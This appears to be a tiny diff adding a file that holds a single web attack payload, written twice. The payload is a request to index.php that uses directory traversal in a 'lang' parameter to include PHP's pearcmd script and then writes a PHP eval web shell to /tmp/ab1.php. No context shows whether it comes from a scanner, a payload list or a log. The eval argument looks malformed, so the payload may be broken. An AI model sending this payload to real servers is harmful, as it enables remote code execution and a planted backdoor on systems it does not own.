@@ -1,0 +1,1 @@
+/index.php?+config-create+/&lang=../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval(['a']);?>+/tmp/ab1.php\n/index.php?+config-create+/&lang=../../../../../../../../../usr/local/lib/php/pearcmd&/<?=@eval(['a']);?>+/tmp/ab1.php
